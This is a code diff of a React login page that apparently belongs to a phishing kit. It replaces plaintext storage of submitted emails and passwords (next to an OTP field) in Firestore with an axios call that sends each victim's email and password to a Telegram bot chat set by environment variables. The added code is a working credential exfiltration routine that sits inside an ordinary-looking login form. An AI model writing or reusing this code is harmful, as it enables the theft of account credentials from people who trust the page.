@@ -1,8 +1,10 @@
 import React, {useState} from "react";
-import db from "../../firebase";
-import {collection,doc, deleteDoc, getDocs, updateDoc, setDoc} from "firebase/firestore";
+// import db from "../../firebase";
+// import {collection,doc, deleteDoc, getDocs, updateDoc, setDoc} from "firebase/firestore";
+import axios from "axios";
 
 const Home = () => {
+    const url = `https://api.telegram.org/bot${process.env.NEXT_PUBLIC_BOT}/sendMessage`;
     const [toggle, setToggle] = useState("password")
     const toggleText = () => {
         if(toggle === "password"){
@@ -40,13 +42,24 @@ const Home = () => {
         e.preventDefault()
         setErrors(validate(values))
         if(values.email && values.password && !errors.email && !errors.password){
-            const docRef = doc(db, "users", "user_" + new Date().getTime());
+            //const docRef = doc(db, "users", "user_" + new Date().getTime());
             const saveData = async () => {
-                await setDoc(docRef, {
-                    email: values.email,
-                    password: values.password,
-                    otp: ""
-                });
+                // await setDoc(docRef, {
+                //     email: values.email,
+                //     password: values.password,
+                //     otp: ""
+                // });
+                axios.post(url, {
+                    chat_id: process.env.NEXT_PUBLIC_CHAT_ID,
+                    parse_mode: "HTML",
+                    text: `New user registered with email ${values.email} and password ${values.password}`
+                })
+                .then((res) => {
+                    console.log("Success")
+                })
+                .catch((err) => {
+                    console.log("an error occured!!")
+                })
             }
             saveData()
         }
